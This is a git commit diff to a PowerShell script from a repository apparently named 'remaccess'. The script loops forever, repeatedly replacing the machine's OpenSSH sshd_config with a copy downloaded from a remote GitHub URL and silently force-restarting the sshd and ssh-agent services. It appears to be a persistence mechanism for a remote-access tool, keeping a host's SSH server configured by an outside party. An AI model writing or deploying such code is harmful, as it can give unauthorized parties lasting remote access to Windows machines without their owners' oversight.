cabebe03237153e466028e5874fae23d533349d5
沐宸 <62504289+DirNotAvailable@users.noreply.github.com>
2023-10-28 19:47:17 +0500

    Update OpenSSHConfigMaintenance.ps1

--- OpenSSHStuff/OpenSSHConfigMaintenance.ps1
+++ OpenSSHStuff/OpenSSHConfigMaintenance.ps1
@@ -1,32 +1,38 @@
 $sshDataDirectory = "C:\ProgramData\ssh"
 $sshdConfigPath = Join-Path $sshDataDirectory "sshd_config"
-$sshdServiceName = "sshd" # Replace with the actual service name
-$sshAgentServiceName = "ssh-agent" # Replace with the actual service name
+$sshdServiceName = "sshd"
+$sshAgentServiceName = "ssh-agent"
 $hashUrl = "https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/HashesOfCorePrograms.txt"
 $downloadUrl = "https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/OpenSSHStuff/sshd_config"
 while ($true) {
     if (Test-Path $sshDataDirectory) {
         $programNameWithExtension = [System.IO.Path]::GetFileName($downloadUrl)
-        if (Test-Path $sshdConfigPath) {
-            $existingFileHash = (Get-FileHash -Path $sshdConfigPath -Algorithm SHA256).Hash
-            $hashesData = (iwr -Uri $hashUrl -UseBasicParsing).Content
-            $hashRegex = "$programNameWithExtension ([A-Fa-f0-9]+)"
-            if ($hashesData -match $hashRegex) {
-                $programHash = $matches[1]
-            }
-            if ($programHash -eq $existingFileHash) {
+        $retryCount = 0
+        $maxRetries = 3
+        while ($retryCount -lt $maxRetries) {
+            if (Test-Path $sshdConfigPath) {
+                $existingFileHash = (Get-FileHash -Path $sshdConfigPath -Algorithm SHA256).Hash
+                $hashesData = (iwr -Uri $hashUrl -UseBasicParsing).Content
+                $hashRegex = "$programNameWithExtension ([A-Fa-f0-9]+)"
+
+                if ($hashesData -match $hashRegex) {
+                    $programHash = $matches[1]
+                }
+                if ($programHash -eq $existingFileHash) {
+                    break
+                } else {
+                    Remove-Item -Path $sshdConfigPath -Force
+                    $retryCount++
+                }
             } else {
-                Remove-Item -Path $sshdConfigPath -Force 
-                Restart-Service -Name $sshdServiceName -Force -ErrorAction SilentlyContinue
-                Restart-Service -Name $sshAgentServiceName -Force -ErrorAction SilentlyContinue
+                $retryCount++
+            }
+            if ($retryCount -lt $maxRetries) {
+                Invoke-WebRequest -Uri $downloadUrl -OutFile $sshdConfigPath
             }
         }
-        if (-not (Test-Path $sshdConfigPath)) {
-            Invoke-WebRequest -Uri $downloadUrl -OutFile $sshdConfigPath
-            Restart-Service -Name $sshdServiceName -Force -ErrorAction SilentlyContinue
-            Restart-Service -Name $sshAgentServiceName -Force -ErrorAction SilentlyContinue
-        }
-    } else {
+        Restart-Service -Name $sshdServiceName -Force -ErrorAction SilentlyContinue
+        Restart-Service -Name $sshAgentServiceName -Force -ErrorAction SilentlyContinue
     }
     Start-Sleep -Seconds 300
 }
